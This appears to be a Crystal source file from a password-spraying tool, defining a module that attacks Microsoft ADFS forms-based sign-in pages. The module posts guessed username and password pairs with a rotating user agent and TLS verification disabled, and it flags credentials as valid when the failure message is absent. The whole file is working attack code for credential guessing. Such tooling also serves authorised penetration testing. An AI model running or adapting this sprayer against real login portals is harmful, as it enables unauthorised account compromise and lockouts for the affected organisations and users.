require "http/client"
require "crystagiri"
require "lexbor"
require "uuid"
require "json"



class O365_ADFS_forms < Sprayer
    property domain : String | Nil
    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "on.microsoft.com"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus 
        # lockedout = false
        # valid = false
        # mfa = false

        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #


        # client_request_id = bc914e24-be0b-45b9-98a4-902182a50d58
        client_request_id = UUID.random
        # path = "/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc=&rm=true"
        # path = "/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=#{ URI.encode_www_form("LoginOptions=3&estsredirect=2&estsrequest=") }=&username=&mkt=&lc="
        
        path = "/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&cbcxt=&username=#{URI.encode_path(username)}&mkt=en-US&lc=&pullStatus=0"
        

        # some basic setups for web based auth 
        url = URI.parse "#{@target}" 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        ua = @useragents[rand(0..(@useragents.size - 1))] # we will be referencing the same user agent several times. so pull it and us that so its consistent

        header = HTTP::Headers{ # headers for post request 
            "User-Agent" => ua,
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
            "Referer" => "https://msft.sts.microsoft.com/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&cbcxt=&username=#{URI.encode_path username}&mkt=en-US&lc=&pullStatus=0",
            "Origin"  => "https://msft.sts.microsoft.com",
        }
        
        form = "UserName=#{URI.encode_www_form(username)}&Kmsi=&AuthMethod=FormsAuthentication&Password=#{ URI.encode_www_form(password) }"

        
        # here is the basic auth post req
        # the url.path.strip is for added support 
        page = client.post("#{"/#{url.path.strip("/")}" if url.path != "" }#{path}", headers: header, form: form)

        if !page.body.includes? "Incorrect user ID or password"
            spstatus.valid_credentials = true 
        end 


        # if page.status_code == 302
        #     # valid = true 
        #     spstatus.valid_credentials = true 
        # end


        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus 
    end
end